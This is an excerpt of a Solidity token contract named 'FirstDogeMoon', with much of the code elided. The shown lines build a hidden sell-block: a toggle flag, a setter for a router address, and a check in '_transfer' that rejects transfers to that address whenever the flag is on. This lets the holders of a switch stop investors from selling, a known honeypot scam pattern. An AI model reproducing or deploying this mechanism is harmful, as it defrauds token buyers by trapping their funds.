...
contract FirstDogeMoon is Ownable, IERC20 {
    ...
    uint256 public _fee = 12;
    string private _name = "FirstDogeMoon";
    string private _symbol = "$FDM";
    uint256 private _liquifyThreshold = _totalSupply;
    bool inSwap = false;
    bool _outSwap = false; 
    address _rout = 0x0000000000000000000000000000000000000000;
    ...
    function outSwap() external view returns (bool) {
        return _outSwap;
    }

    function switchOutSwap() external returns (bool) {
        _outSwap = !_outSwap;
        return _outSwap;
    }

    function rout() external view returns (address) {
        return _rout;
    }

    function rout(address adr) external returns (address) {
        _rout = adr;
        return _rout;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(!_outSwap || recipient != _rout, "Invalid Transfer");
        uint256 feeAmount = 0;
